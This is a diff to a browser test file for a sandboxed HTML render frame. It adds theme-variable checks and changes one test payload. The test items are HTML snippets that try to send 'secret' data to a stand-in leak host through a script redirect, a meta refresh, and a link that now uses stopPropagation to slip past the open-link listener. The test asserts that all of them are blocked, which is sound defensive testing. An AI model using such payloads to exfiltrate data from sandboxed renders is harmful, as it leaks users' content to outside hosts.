@@ -18,7 +18,8 @@ declare module "vitest/browser" {
 
 it.each([
   `<script>location.href='https://render-leak.invalid/script?secret=content'</script>`,
-  `<a href="https://render-leak.invalid/link?secret=content">Leave</a>`,
+  // Agent code can bypass the open-link listener; the CSP violation backstop still applies.
+  `<a href="https://render-leak.invalid/link?secret=content" onclick="event.stopPropagation()">Leave</a>`,
   `<meta http-equiv="refresh" content="0;url=https://render-leak.invalid/refresh?secret=content">`,
 ])("blocks navigation before requests and hides the failed visual: %s", async (html) => {
   expect(
@@ -30,7 +31,8 @@ it("runs JavaScript without same-origin privileges and syncs theme changes", asy
   const host = document.createElement("div");
   document.body.append(host);
   const root = createRoot(host);
-  const observations: Array<{ blocked: boolean; color: string }> = [];
+  const observations: Array<{ blocked: boolean; color: string; chart: string; radius: string }> =
+    [];
   function receive(event: MessageEvent) {
     if (
       event.source === host.querySelector("iframe")?.contentWindow?.[0] &&
@@ -39,8 +41,12 @@ it("runs JavaScript without same-origin privileges and syncs theme changes", asy
       observations.push(event.data);
   }
   window.addEventListener("message", receive);
-  const original = document.documentElement.style.getPropertyValue("--primary");
+  const original = ["--primary", "--chart-1", "--radius"].map(
+    (key) => [key, document.documentElement.style.getPropertyValue(key)] as const,
+  );
   document.documentElement.style.setProperty("--primary", "rgb(1, 2, 3)");
+  document.documentElement.style.setProperty("--chart-1", "rgb(7, 8, 9)");
+  document.documentElement.style.setProperty("--radius", "3px");
   try {
     root.render(
       <HtmlRenderFrame
@@ -50,7 +56,10 @@ it("runs JavaScript without same-origin privileges and syncs theme changes", asy
        let blocked = false; try { void parent.document.body; } catch { blocked = true; }
       parent.postMessage({type:'securitypolicyviolation',effectiveDirective:'frame-src'}, '*');
       dispatchEvent(new SecurityPolicyViolationEvent('securitypolicyviolation', {effectiveDirective:'frame-src'}));
-      function report() { parent.parent.postMessage({ type:'render-test', blocked, color:getComputedStyle(document.documentElement).getPropertyValue('--primary') }, '*'); }
+      function report() {
+        const styles = getComputedStyle(document.documentElement);
+        parent.parent.postMessage({ type:'render-test', blocked, color:styles.getPropertyValue('--primary'), chart:styles.getPropertyValue('--chart-1'), radius:styles.getPropertyValue('--radius') }, '*');
+      }
       addEventListener('message', () => setTimeout(report, 0));
     </script>`,
         }}
@@ -59,6 +68,7 @@ it("runs JavaScript without same-origin privileges and syncs theme changes", asy
     await expect
       .poll(() => observations.some((value) => value.blocked && value.color === "rgb(1, 2, 3)"))
       .toBe(true);
+    expect(observations.at(-1)).toMatchObject({ chart: "rgb(7, 8, 9)", radius: "3px" });
     document.documentElement.style.setProperty("--primary", "rgb(4, 5, 6)");
     await expect
       .poll(() => observations.some((value) => value.blocked && value.color === "rgb(4, 5, 6)"))
@@ -68,7 +78,7 @@ it("runs JavaScript without same-origin privileges and syncs theme changes", asy
     root.unmount();
     host.remove();
     window.removeEventListener("message", receive);
-    document.documentElement.style.setProperty("--primary", original);
+    for (const [key, value] of original) document.documentElement.style.setProperty(key, value);
   }
 });
 
